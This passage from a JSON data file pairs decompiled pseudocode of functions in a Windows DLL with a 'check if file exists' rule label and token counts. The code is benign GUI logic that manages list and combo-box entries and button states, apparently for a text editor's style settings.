{\n                puVar8 = CONCAT62(Stack198, uStack200);\n            }\n            (**0x1800de7f0)(*(arg1 + 0x68), 0x180, 0, puVar8);\n            fcn.180048ec0(auStack160);\n            fcn.180042e30(aiStack232);\n            iVar7 = iVar7 + 0x60;\n        } while (iVar7 != iVar9);\n        iVar9 = *(arg2 + 0x50);\n        iVar7 = *(arg2 + 0x48);\n    }\n    iVar4 = iVar9 - iVar7 >> 0x3f;\n    if ((iVar9 - iVar7) / 0x60 + iVar4 != iVar4) {\n        (**0x1800de7f0)(*(arg1 + 0x68), 0x186, 0, 0);\n    }\n    uVar5 = fcn.18000de50(aiStack232, arg2);\n    fcn.180041300(arg1, uVar5);\n    (**0x1800de7f0)(*(arg1 + 0x70), 0x14b, 0, 0);\n    (**0x1800de7f0)(*(arg1 + 0x88), 0x14b, 0, 0);\n    iVar7 = *(arg1 + 0xa8);\n    iVar9 = *(arg1 + 0xb0);\n    do {\n        if (iVar7 == iVar9) {\n            *(arg1 + 0x53) = 1;\n            fcn.180044120(arg1);\n            fcn.18008fb00(uStack40 ^ auStack280);\n            return;\n        }\n        fcn.18000de50(aiStack232, iVar7);\n        fcn.18000da90(&uStack200, iVar7 + 0x20);\n        puVar8 = &uStack200;\n        if (7 < uStack176) {\n            puVar8 = CONCAT62(Stack198, uStack200);\n        }\n        (**0x1800de7f0)(*(arg1 + 0x70), 0x143, 0, puVar8);\n        puVar8 = &uStack200;\n        if (7 < uStack176) {\n            puVar8 = CONCAT62(Stack198, uStack200);\n        }\n        (**0x1800de7f0)(*(arg1 + 0x88), 0x143, 0, puVar8);\n        if (7 < uStack176) {\n            iVar2 = CONCAT62(Stack198, uStack200);\n            iVar4 = iVar2;\n            if (0xfff < uStack176 * 2 + 2) {\n                iVar6 = uStack176 * 2 + 0x29;\n                iVar4 = *(iVar2 + -8);\n                if (0x1f < (iVar2 - iVar4) - 8U) goto code_r0x000180043fd8;\n            }\n            fcn.18008fb24(iVar4);\n        }\n        uStack184 = 0;\n        uStack176 = 7;\n        uStack200 = 0;\n        if (0xf < uStack208) {\n            iVar4 = aiStack232[0];\n            if (0xfff < uStack208 + 1) {\n                iVar6 = uStack208 + 0x28;\n                iVar4 = *(aiStack232[0] + -8);\n                if (0x1f < (aiStack232[0] - iVar4) - 8U) {\ncode_r0x000180043fd8:\n                    fcn.1800b3528(iVar4, iVar6);\n                    pcVar1 = swi(3);\n                    (*pcVar1)();\n                    return;\n                }\n            }\n            fcn.18008fb24(iVar4);\n        }\n        iVar7 = iVar7 + 0x40;\n    } while( true );\n}\n",
        "token_count": 1537
    },
    "18004412": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid fcn.180044120(int64_t arg1)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uchar *arg2;\n    uchar auStack152 [32];\n    uchar auStack120 [16];\n    uint uStack104;\n    uint uStack100;\n    uint uStack96;\n    uint uStack92;\n    ushort uStack88;\n    uint uStack72;\n    uint uStack68;\n    uint uStack64;\n    uint uStack60;\n    uint uStack56;\n    uchar uStack52;\n    ulong uStack48;\n    uint uStack40;\n    uint uStack36;\n    uint uStack32;\n    uint uStack28;\n    uint64_t uStack24;\n    \n    uStack24 = *0x180123080 ^ auStack152;\n    iVar1 = (**0x1800de7f0)(*(arg1 + 0x58), 0x188, 0, 0);\n    if (iVar1 != -1) {\n        iVar2 = (**0x1800de7f0)(*(arg1 + 0x68), 0x188, 0, 0);\n        if (iVar2 != -1) {\n            arg2 = iVar2 * 0x60 + *(iVar1 * 0x60 + 0x48 + *(arg1 + 0xc0));\n            goto code_r0x0001800441f3;\n        }\n    }\n    arg2 = auStack120;\n    uStack104 = *0x180101910;\n    uStack100 = *0x180101914;\n    uStack96 = *0x180101918;\n    uStack92 = *0x18010191c;\n    auStack120[0] = 0;\n    uStack40 = 0;\n    uStack36 = 0;\n    uStack32 = 0;\n    uStack28 = 0;\n    uStack72 = *0x180101900;\n    uStack68 = *0x180101904;\n    uStack64 = *0x180101908;\n    uStack60 = *0x18010190c;\n    uStack88 = 0;\n    uStack56 = 0;\n    uStack52 = 0;\n    uStack48 = 0;\n    fcn.180048ec0(&uStack48);\n    fcn.180042e30(auStack120);\ncode_r0x0001800441f3:\n    fcn.180044240(arg1, arg2);\n    fcn.180044340(arg1);\n    fcn.180044fa0(arg1);\n    fcn.1800451b0(arg1, arg2);\n    fcn.18008fb00(uStack24 ^ auStack152);\n    return;\n}\n",
        "token_count": 599
    },
    "18004434": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid fcn.180044340(int64_t arg1)\n\n{\n    int64_t iVar1;\n    int64_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    ulong uVar5;\n    \n    iVar3 = (**0x1800de7f0)(*(arg1 + 0x58), 0x188, 0, 0);\n    if ((iVar3 != -1) && (iVar4 = (**0x1800de7f0)(*(arg1 + 0x68), 0x188, 0, 0),  iVar4 != -1)) {\n        iVar1 = *(iVar3 * 0x60 + 0x50 + *(arg1 + 0xc0));\n        iVar2 = *(iVar3 * 0x60 + 0x48 + *(arg1 + 0xc0));\n        uVar5 = (**0x1800de798)(*(arg1 + 0x18), 0x27ef);\n        (**0x1800de770)(uVar5, iVar4 < (iVar1 - iVar2) / 0x60 + -1);\n        uVar5 = (**0x1800de798)(*(arg1 + 0x18), 0x27f0);\n        (**0x1800de770)(uVar5, 0 < iVar4);\n    }\n    return;\n}\n",
        "token_count": 304
    },
    "180044b0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid fcn.180044b00(int64_t arg1)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    char in_DL;\n    ulong *arg2;\n    int64_t *piVar3;\n    ulong *puVar4;\n    ulong *arg1_00;\n    ulong *puVar5;\n    int64_t iVar6;\n    ushort *puVar7;\n    int64_t arg2_00;\n    int64_t iVar8;\n    uchar auStack200 [32];\n    ulong uStack168;\n    uchar uStack152;\n    uint uStack136;\n    uint uStack132;\n    uint uStack128;\n    uint uStack124;\n    ushort uStack120;\n    unkbyte6 Stack118;\n    uint uStack104;\n    uint uStack100;\n    uint uStack96;\n    uint uStack92;\n    uint uStack88;\n    uchar uStack84;\n    int64_t iStack80;\n    uint uStack72;\n    uint uStack68;\n    uint uStack64;\n    uint uStack60;\n    uint64_t uStack56;\n    \n    uStack168 = 0xfffffffffffffffe;\n    uStack56 = *0x180123080 ^ auStack200;\n    iVar1 = (**0x1800de7f0)(*(arg1 + 0x58), 0x188, 0, 0);\n    if (iVar1 != -1) {\n        iVar2 = (**0x1800de7f0)(*(arg1 + 0x68), 0x188, 0, 0);\n        if (iVar2 == -1) {\n            iVar2 = -1;\n        }\n        if ((in_DL == '\\0') || (iVar2 != -1)) {\n            iVar8 = iVar1 * 0x60 + *(arg1 + 0xc0);\n            uStack136 = *0x180101910;\n            uStack132 = *0x180101914;\n            uStack128 = *0x180101918;\n            uStack124 = *0x18010191c;\n            uStack152 = 0;\n            uStack104 = *0x180101900;\n            uStack100 = *0x180101904;\n            uStack96 = *0x180101908;\n            uStack92 = *0x18010190c;\n            iVar6 = 0;\n            uStack120 = 0;\n            uStack88 = 0;\n            uStack84 = 0;\n            iStack80 = 0;\n            uStack72 = 0;\n            uStack68 = 0;\n            uStack64 = 0;\n            uStack60 = 0;\n            if (in_DL != '\\0') {\n                puVar5 = iVar2 * 0x60 + *(iVar8 + 0x48);\n                if (&uStack152 != puVar5) {\n                    puVar4 = puVar5;\n                    if (0xf < puVar5[3]) {\n                        puVar4 = *puVar5;\n                    }\n                    fcn.180011120(&uStack152, puVar4, puVar5[2]);\n                }\n                piVar3 = puVar5 + 4;\n                if (&uStack120 != piVar3) {\n                    if (7 < puVar5[7]) {\n                        piVar3 = *piVar3;\n                    }\n                    fcn.180010d70(&uStack120, piVar3, puVar5[6]);\n                }\n                uStack88 = *(puVar5 + 8);\n                uStack84 = *(puVar5 + 0x44);\n                arg2_00 = puVar5[10] - puVar5[9] >> 6;\n                fcn.180048c70(&iStack80, arg2_00);\n                for (; arg2_00 != 0; arg2_00 = arg2_00 + -1) {\n                    puVar4 = puVar5[9] + iVar6;\n                    arg1_00 = iStack80 + iVar6;\n                    if (arg1_00 != puVar4) {\n                        arg2 = puVar4;\n                        if (0xf < puVar4[3]) {\n                            arg2 = *puVar4;\n                        }\n                        fcn.180011120(arg1_00, arg2, puVar4[2]);\n                    }\n                    piVar3 = puVar4 + 4;\n                    if (arg1_00 + 4 != piVar3) {\n                        if (7 < puVar4[7]) {\n                            piVar3 = *piVar3;\n                        }\n                        fcn.180010d70(arg1_00 + 4, piVar3, puVar4[6]);\n                    }\n                    iVar6 = iVar6 + 0x40;\n                }\n            }\n            iVar6 = *(iVar8 + 0x50);\n            if (iVar6 == *(iVar8 + 0x58)) {\n                fcn.180049260(iVar8 + 0x48, iVar6, &uStack152);\n            }\n            else {\n                fcn.180043fe0(iVar6, &uStack152);\n                *(iVar8 + 0x50) = *(iVar8 + 0x50) + 0x60;\n            }\n            iVar6 = *(iVar8 + 0x50);\n            iVar8 = *(iVar8 + 0x48);\n            puVar7 = &uStack120;\n            if (7 < CONCAT44(uStack92, uStack96)) {\n                puVar7 = CONCAT62(Stack118, uStack120);\n            }\n            (**0x1800de7f0)(*(arg1 + 0x68), 0x180, 0, puVar7);\n            (**0x1800de7f0)(*(arg1 + 0x68), 0x186, (iVar6 - iVar8) / 0x60 + -1, 0);\n            fcn.180044120(arg1);\n            *(arg1 + 0x51) = 0;\n            *(arg1 + 0x53) = in_DL;\n            fcn.180044430(arg1);\n            fcn.180048ec0(&iStack80);\n            fcn.180042e30(&uStack152);\n        }\n    }\n    fcn.18008fb00(uStack56 ^ auStack200);\n    return;\n}\n",
        "token_count": 1382
    },
    "180044dd": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nint32_t fcn.180044dd0(int64_t arg1)\n\n{\n    ulong *arg1_00;\n    ulong *puVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int64_t iVar4;\n    int32_t iVar5;\n    ulong *puVar6;\n    int64_t arg2;\n    int64_t iVar7;\n    \n    iVar2 = (**0x1800de7f0)(*(arg1 + 0x58), 0x188, 0, 0);\n    if (iVar2 != -1) {\n        iVar3 = (**0x1800de7f0)(*(arg1 + 0x68), 0x188, 0, 0);\n        if (iVar3 != -1) {\n            iVar7 = iVar2 * 0x60 + *(arg1 + 0xc0);\n            iVar4 = *(iVar7 + 0x50);\n            arg2 = iVar3 * 0x60 + 0x60 + *(iVar7 + 0x48);\n            if (arg2 != iVar4) {\n                puVar6 = arg2 + -8;\n                do {\n                    fcn.18000dd60(puVar6 + -0xb, arg2);\n                    fcn.18000d960(puVar6 + -7, puVar6 + 5);\n                    arg1_00 = puVar6 + -2;\n                    *(puVar6 + -3) = *(puVar6 + 9);\n                    puVar1 = puVar6 + 10;\n                    *(puVar6 + -0x14) = *(puVar6 + 0x4c);\n                    if (arg1_00 != puVar1) {\n                        fcn.180048ec0(arg1_00);\n                        *arg1_00 = *puVar1;\n                        puVar6[-1] = puVar6[0xb];\n                        *puVar6 = puVar6[0xc];\n                        *puVar1 = 0;\n                        puVar6[0xb] = 0;\n                        puVar6[0xc] = 0;\n                    }\n                    arg2 = arg2 + 0x60;\n                    puVar6 = puVar6 + 0xc;\n                } while (arg2 != iVar4);\n                iVar4 = *(iVar7 + 0x50);\n            }\n            fcn.180048ec0(iVar4 + -0x18);\n            fcn.180042e30(iVar4 + -0x60);\n            *(iVar7 + 0x50) = *(iVar7 + 0x50) + -0x60;\n            iVar4 = *(iVar7 + 0x50) - *(iVar7 + 0x48);\n            iVar4 = iVar4 / 6 + (iVar4 >> 0x3f);\n            iVar5 = (iVar4 >> 4) - (iVar4 >> 0x3f);\n            iVar2 = iVar5 + -1;\n            if (iVar3 <= iVar5 + -2) {\n                iVar2 = iVar3;\n            }\n            (**0x1800de7f0)(*(arg1 + 0x68), 0x182, iVar3, 0);\n            (**0x1800de7f0)(*(arg1 + 0x68), 0x186, iVar2, 0);\n            *(arg1 + 0x51) = 0;\n            *(arg1 + 0x53) = 1;\n            fcn.180044120(arg1);\n            return iVar2;\n        }\n    }\n    return -1;\n}\n",
        "token_count": 787
    },
    "18004593": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid fcn.180045930(int64_t arg1)\n\n{\n    uint32_t *arg2;\n    code *pcVar1;\n    int64_t iVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    uint32_t uVar7;\n    uint32_t uVar8;\n    uint32_t uVar9;\n    uint32_t uVar10;\n    uint32_t uVar11;\n    int32_t iVar12;\n    int32_t iVar13;\n    int64_t iVar14;\n    uint64_t uVar15;\n    uint64_t uVar16;\n    int64_t iVar17;\n    uint32_t uStack88;\n    uint32_t uStack84;\n    uint32_t uStack80;\n    uint32_t uStack76;\n    uint32_t uStack72;\n    uint32_t uStack68;\n    uint32_t uStack64;\n    uint32_t uStack60;\n    ushort uStack56;\n    uint16_t uStack54;\n    uint32_t uStack52;\n    uint32_t uStack48;\n    uint32_t uStack44;\n    uint32_t uStack40;\n    uint32_t uStack36;\n    uint32_t uStack32;\n    uint32_t uStack28;\n    ulong uStack24;\n    \n    uStack24 = 0xfffffffffffffffe;\n    if (0x3f < *(arg1 + 0xb0) - *(arg1 + 0xa8)) {\n        iVar12 = (**0x1800de7f0)(*(arg1 + 0x58), 0x188, 0, 0);\n        if (iVar12 == -1) {\n            return;\n        }\n        iVar13 = (**0x1800de7f0)(*(arg1 + 0x68), 0x188, 0, 0);\n        uVar11 = uStack88;\n        uVar10 = *0x18010191c;\n        uVar9 = *0x180101918;\n        uVar8 = *0x180101914;\n        uVar7 = *0x180101910;\n        uVar6 = *0x18010190c;\n        uVar5 = *0x180101908;\n        uVar4 = *0x180101904;\n        uVar3 = *0x180101900;\n        if (iVar13 == -1) {\n            return;\n        }\n        iVar17 = iVar13 * 0x60 + *(iVar12 * 0x60 + 0x48 + *(arg1 + 0xc0));\n        uStack72 = *0x180101910;\n        uStack68 = *0x180101914;\n        uStack64 = *0x180101918;\n        uStack60 = *0x18010191c;\n        uStack88 = uStack88 & 0xffffff00;\n        uStack40 = *0x180101900;\n        uStack36 = *0x180101904;\n        uStack32 = *0x180101908;\n        uStack28 = *0x18010190c;\n        uStack56 = 0;\n        arg2 = *(iVar17 + 0x50);\n        if (arg2 == *(iVar17 + 0x58)) {\n            fcn.180049450(iVar17 + 0x48, arg2, &uStack88);\n            uVar15 = CONCAT44(uStack28, uStack32);\n            uVar16 = CONCAT44(uStack60, uStack64);\n        }\n        else {\n            *arg2 = uStack88;\n            arg2[1] = uStack84;\n            arg2[2] = uStack80;\n            arg2[3] = uStack76;\n            arg2[4] = uVar7;\n            arg2[5] = uVar8;\n            arg2[6] = uVar9;\n            arg2[7] = uVar10;\n            uVar16 = 0xf;\n            uStack88 = uVar11 & 0xffffff00;\n            arg2[8] = uStack54 << 0x10;\n            arg2[9] = uStack52;\n            arg2[10] = uStack48;\n            arg2[0xb] = uStack44;\n            arg2[0xc] = uVar3;\n            arg2[0xd] = uVar4;\n            arg2[0xe] = uVar5;\n            arg2[0xf] = uVar6;\n            uVar15 = 7;\n            uStack56 = 0;\n            *(iVar17 + 0x50) = *(iVar17 + 0x50) + 0x40;\n        }\n        if (7 < uVar15) {\n            uVar15 = uVar15 * 2 + 2;\n            iVar2 = CONCAT44(uStack52, CONCAT22(uStack54, uStack56));\n            iVar14 = iVar2;\n            if ((0xfff < uVar15) && (iVar14 = *(iVar2 + -8),  0x1f < (iVar2 - iVar14) - 8U)) goto code_r0x000180045b21;\n            fcn.18008fb24(iVar14);\n        }\n        if (0xf < uVar16) {\n            uVar15 = uVar16 + 1;\n            iVar2 = CONCAT44(uStack84, uStack88);\n            iVar14 = iVar2;\n            if ((0xfff < uVar15) && (iVar14 = *(iVar2 + -8),  0x1f < (iVar2 - iVar14) - 8U)) {\ncode_r0x000180045b21:\n                fcn.1800b3528(iVar14, uVar15 + 0x27);\n                pcVar1 = swi(3);\n                (*pcVar1)();\n                return;\n            }\n            fcn.18008fb24(iVar14);\n        }\n        iVar14 = *(iVar17 + 0x50);\n        iVar17 = *(iVar17 + 0x48);\n        (**0x1800de7f0)(*(arg1 + 0x80), 0x180, 0, 0x1800f749c);\n        (**0x1800de7f0)(*(arg1 + 0x80), 0x186, (iVar14 - iVar17 >> 6) + -1, 0);\n        fcn.180045360(arg1);\n        fcn.1800455a0(arg1);\n        *(arg1 + 0x51) = 0;\n        *(arg1 + 0x54) = 0;\n        fcn.1800455a0(arg1);\n    }\n    return;\n}\n",
        "token_count": 1476
    },
    "180045b3": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint64_t fcn.180045b30(int64_t arg1)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint64_t uVar4;\n    uint32_t uVar5;\n    int64_t arg2;\n    int64_t iVar6;\n    int64_t iVar7;\n    \n    uVar4 = (**0x1800de7f0)(*(arg1 + 0x80), 0x18b, 0, 0);\n    if (uVar4 != -1) {\n        if (uVar4 == 0) {\n            return uVar4;\n        }\n        iVar1 = (**0x1800de7f0)(*(arg1 + 0x58), 0x188, 0, 0);\n        if (iVar1 != -1) {\n            iVar2 = (**0x1800de7f0)(*(arg1 + 0x68), 0x188, 0, 0);\n            if (iVar2 != -1) {\n                uVar3 = (**0x1800de7f0)(*(arg1 + 0x80), 0x188, 0, 0);\n                if (uVar3 != 0xffffffff) {\n                    iVar6 = *(iVar1 * 0x60 + 0x48 + *(arg1 + 0xc0)) + iVar2 * 0x60;\n                    iVar7 = *(iVar6 + 0x50);\n                    arg2 = uVar3 * 0x40 + 0x40 + *(iVar6 + 0x48);\n                    if (arg2 != iVar7) {\n                        do {\n                            fcn.18000dd60(arg2 + -0x40, arg2);\n                            fcn.18000d960(arg2 + -0x20, arg2 + 0x20);\n                            arg2 = arg2 + 0x40;\n                        } while (arg2 != iVar7);\n                        iVar7 = *(iVar6 + 0x50);\n                    }\n                    fcn.180042e30(iVar7 + -0x40);\n                    *(iVar6 + 0x50) = *(iVar6 + 0x50) + -0x40;\n                    iVar1 = *(iVar6 + 0x50) - *(iVar6 + 0x48) >> 6;\n                    uVar5 = iVar1 - 1;\n                    if (uVar3 <= iVar1 + -2) {\n                        uVar5 = uVar3;\n                    }\n                    (**0x1800de7f0)(*(arg1 + 0x80), 0x182, uVar3, 0);\n                    (**0x1800de7f0)(*(arg1 + 0x80), 0x186, uVar5, 0);\n                    *(arg1 + 0x51) = 0;\n                    *(arg1 + 0x54) = 1;\n                    fcn.180045360(arg1);\n                    fcn.1800455a0(arg1);\n                    return uVar5;\n                }\n            }\n        }\n    }\n    return 0xffffffff;\n}\n",
        "token_count": 689
    },
    "18004631": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid fcn.180046310(int64_t arg1)\n\n{\n    uint64_t uVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    int64_t iVar4;\n    int64_t iVar5;\n    char in_DL;\n    ulong noname_2;\n    ushort *puVar6;\n    uchar auStack88 [32];\n    ulong uStack56;\n    ushort uStack48;\n    unkbyte6 Stack46;\n    uint uStack32;\n    uint uStack28;\n    uint uStack24;\n    uint uStack20;\n    uint64_t uStack16;\n    \n    uStack56 = 0xfffffffffffffffe;\n    uStack16 = *0x180123080 ^ auStack88;\n    iVar5 = arg1;\n    fcn.18003cb00();\n    fcn.18003cc00(iVar5, *(arg1 + 0x18), 2);\n    if (in_DL == '\\0') goto code_r0x0001800463ea;\n    noname_2 = 0;\n    iVar3 = (**0x1800de7f0)(*(arg1 + 0x58), 0x188, 0, 0);\n    if (iVar3 == -1) goto code_r0x0001800463ea;\n    uStack32 = *0x180101900;\n    uStack28 = *0x180101904;\n    uStack24 = *0x180101908;\n    uStack20 = *0x18010190c;\n    uStack48 = 0;\n    iVar3 = fcn.180046c40(arg1, iVar3, noname_2, &uStack48);\n    if (iVar3 < 0) {\n        (**0x1800de718)(*0x180123eb8, 0);\n        if (CONCAT44(uStack20, uStack24) < 8) goto code_r0x0001800463ea;\n        uVar1 = CONCAT44(uStack20, uStack24) * 2 + 2;\n        iVar5 = CONCAT62(Stack46, uStack48);\n        if (0xfff < uVar1) {\n            iVar4 = iVar5 - *(iVar5 + -8);\n            iVar5 = *(iVar5 + -8);\njoined_r0x000180046456:\n            if (0x1f < iVar4 - 8U) {\n                fcn.1800b3528(iVar5, uVar1 + 0x27);\n                pcVar2 = swi(3);\n                (*pcVar2)();\n                return;\n            }\n        }\n    }\n    else {\n        puVar6 = &uStack48;\n        if (7 < CONCAT44(uStack20, uStack24)) {\n            puVar6 = CONCAT62(Stack46, uStack48);\n        }\n        (**0x1800de788)(*0x180123eb8, 0x24ba, puVar6);\n        if (CONCAT44(uStack20, uStack24) < 8) goto code_r0x0001800463ea;\n        uVar1 = CONCAT44(uStack20, uStack24) * 2 + 2;\n        iVar5 = CONCAT62(Stack46, uStack48);\n        if (0xfff < uVar1) {\n            iVar4 = iVar5 - *(iVar5 + -8);\n            iVar5 = *(iVar5 + -8);\n            goto joined_r0x000180046456;\n        }\n    }\n    fcn.18008fb24(iVar5);\ncode_r0x0001800463ea:\n    fcn.18008fb00(uStack16 ^ auStack88);\n    return;\n}\n",
        "token_count": 793
    },
    "18004f04": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint64_t fcn.18004f040(int64_t arg1, int64_t *arg2)\n\n{\n    int64_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint64_t uVar4;\n    int64_t iVar5;\n    \n    uVar4 = (**0x1800de7f0)(*(arg1 + 0xb8), 0x188, 0, 0);\n    iVar2 = uVar4;\n    if (iVar2 != -1) {\n        uVar4 = (**0x1800de7f0)(*(arg1 + 0xc0), 0x188, 0, 0);\n        iVar3 = uVar4;\n        if (iVar3 != -1) {\n            iVar1 = *(arg1 + 200) + iVar2 * 0x48;\n            iVar5 = *(*(arg1 + 200) + 0x30 + iVar2 * 0x48);\n            if (iVar3 < *(iVar1 + 0x38) - iVar5 >> 4) {\n                iVar5 = iVar3 * 0x10 + iVar5;\n                *arg2 = iVar5;\n                return CONCAT71(iVar5 >> 8, 1);\n            }\n            iVar1 = iVar1 + 0x20;\n            *arg2 = iVar1;\n            return CONCAT71(iVar1 >> 8, 1);\n        }\n    }\n    return uVar4 & 0xffffffffffffff00;\n}\n",
        "token_count": 327
    },
    "18004f11": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid fcn.18004f110(int64_t arg1)\n\n{\n    code *pcVar1;\n    int64_t iVar2;\n    int32_t iVar3;\n    ulong noname_0;\n    int64_t arg1_00;\n    uint64_t uVar4;\n    ulong *puVar5;\n    uchar auStack136 [32];\n    ulong uStack104;\n    ulong uStack88;\n    uint64_t uStack80;\n    int64_t iStack56;\n    ulong uStack48;\n    int64_t iStack40;\n    uint64_t uStack24;\n    \n    uStack24 = *0x180123080 ^ auStack136;\n    noname_0 = *(arg1 + 0xb8);\n    iVar3 = (**0x1800de7f0)(noname_0, 0x188, 0, 0);\n    if (iVar3 == -1) {\n        fcn.18004dc10(noname_0, &uStack104);\n        puVar5 = &uStack104;\n        if (iStack56 != 0) {\n            uVar4 = iStack40 - iStack56 & 0xfffffffffffffff0;\n            arg1_00 = iStack56;\n            if ((0xfff < uVar4) && (arg1_00 = *(iStack56 + -8),  0x1f < (iStack56 - arg1_00) - 8U))\n            goto code_r0x00018004f274;\n            fcn.18008fb24(arg1_00);\n            iStack56 = 0;\n            uStack48 = 0;\n            iStack40 = 0;\n        }\n        if (7 < uStack80) {\n            iVar2 = CONCAT62(uStack104._2_6_, uStack104);\n            uVar4 = uStack80 * 2 + 2;\n            arg1_00 = iVar2;\n            if ((0xfff < uVar4) && (arg1_00 = *(iVar2 + -8),  0x1f < (iVar2 - arg1_00) - 8U)) {\ncode_r0x00018004f274:\n                fcn.1800b3528(arg1_00, uVar4 + 0x27);\n                pcVar1 = swi(3);\n                (*pcVar1)();\n                return;\n            }\n            fcn.18008fb24(arg1_00);\n        }\n        uStack88 = *0x180101900;\n        uStack80 = *0x180101908;\n        uStack104._0_2_ = 0;\n    }\n    else {\n        puVar5 = *(arg1 + 200) + iVar3 * 0x48;\n    }\n    *(arg1 + 0xb4) = 1;\n    if (7 < puVar5[3]) {\n        puVar5 = *puVar5;\n    }\n    (**0x1800de788)(*(arg1 + 0x18), 0x23f6, puVar5);\n    *(arg1 + 0xb4) = 0;\n    fcn.18004f280(arg1);\n    fcn.18004f8d0(arg1);\n    fcn.18008fb00(uStack24 ^ auStack136);\n    return;\n}\n",
        "token_count": 721
    },
    "18004f28": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid fcn.18004f280(int64_t arg1)\n\n{\n    int64_t iVar1;\n    int64_t iVar2;\n    int32_t iVar3;\n    ulong uVar4;\n    \n    iVar3 = (**0x1800de7f0)(*(arg1 + 0xb8), 0x188, 0, 0);\n    if (iVar3 != -1) {\n        iVar1 = *(arg1 + 0xd0);\n        iVar2 = *(arg1 + 200);\n        uVar4 = (**0x1800de798)(*(arg1 + 0x18), 0x23f3);\n        (**0x1800de770)(uVar4, iVar3 < (iVar1 - iVar2) / 0x48 + -1);\n        uVar4 = (**0x1800de798)(*(arg1 + 0x18), 0x23f4);\n        (**0x1800de770)(uVar4, 0 < iVar3);\n    }\n    return;\n}\n",
        "token_count": 227
    },
    "18004f8d": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid fcn.18004f8d0(int64_t arg1)\n\n{\n    int64_t iVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    ulong uVar4;\n    int64_t iVar5;\n    uint64_t uVar6;\n    uint64_t arg4;\n    uint32_t uVar7;\n    ushort *puVar8;\n    uchar auStack152 [32];\n    ushort uStack120;\n    unkbyte6 Stack118;\n    ulong uStack104;\n    uint64_t uStack96;\n    int64_t iStack72;\n    ulong uStack64;\n    int64_t iStack56;\n    uchar auStack40 [24];\n    uint64_t uStack16;\n    \n    uStack16 = *0x180123080 ^ auStack152;\n    uVar4 = *(arg1 + 0xb8);\n    iVar3 = (**0x1800de7f0)(uVar4, 0x188);\n    arg4 = 0;\n    if (iVar3 == -1) {\n        fcn.18004dc10(uVar4, &uStack120);\n        puVar8 = &uStack120;\n        if (iStack72 != 0) {\n            uVar6 = iStack56 - iStack72 & 0xfffffffffffffff0;\n            iVar5 = iStack72;\n            if ((0xfff < uVar6) && (iVar5 = *(iStack72 + -8),  0x1f < (iStack72 - iVar5) - 8U))\n            goto code_r0x00018004fb43;\n            fcn.18008fb24(iVar5);\n            iStack72 = 0;\n            uStack64 = 0;\n            iStack56 = 0;\n        }\n        if (7 < uStack96) {\n            iVar1 = CONCAT62(Stack118, uStack120);\n            uVar6 = uStack96 * 2 + 2;\n            iVar5 = iVar1;\n            if ((0xfff < uVar6) && (iVar5 = *(iVar1 + -8),  0x1f < (iVar1 - iVar5) - 8U)) {\ncode_r0x00018004fb43:\n                fcn.1800b3528(iVar5, uVar6 + 0x27);\n                pcVar2 = swi(3);\n                (*pcVar2)();\n                return;\n            }\n            fcn.18008fb24(iVar5);\n        }\n        uStack104 = *0x180101900;\n        uStack96 = *0x180101908;\n        uStack120 = 0;\n    }\n    else {\n        puVar8 = *(arg1 + 200) + iVar3 * 0x48;\n    }\n    iVar5 = *(puVar8 + 0x1c);\n    iVar1 = *(puVar8 + 0x18);\n    (**0x1800de7f0)(*(arg1 + 0xc0), 0x184);\n    iVar3 = iVar5 - iVar1 >> 4;\n    if (0 < iVar3) {\n        do {\n            fcn.180020a90(auStack40, 10, 0x1800fa320, arg4);\n            (**0x1800de7f0)(*(arg1 + 0xc0), 0x180);\n            uVar7 = arg4 + 1;\n            arg4 = uVar7;\n        } while (uVar7 < iVar3);\n    }\n    (**0x1800de7f0)(*(arg1 + 0xc0), 0x180, 0, L\"EOL Marker Style\");\n    (**0x1800de7f0)(*(arg1 + 0xc0), 0x186, 0, 0);\n    iVar3 = (**0x1800de7f0)(*(arg1 + 0xb8), 0x188, 0, 0);\n    if (iVar3 != -1) {\n        iVar3 = (**0x1800de7f0)(*(arg1 + 0xc0), 0x188, 0, 0);\n        if (iVar3 != -1) {\n            uVar4 = (**0x1800de798)(*(arg1 + 0x18));\n            (**0x1800de770)(uVar4);\n            fcn.18004fc00(arg1);\n            fcn.18004ff70(arg1);\n        }\n    }\n    fcn.180050280(arg1, 0, 0x1d);\n    fcn.18008fb00(uStack16 ^ auStack152);\n    return;\n}\n",
        "token_count": 1014
    },
    "18004fb5": {
        "rules": [
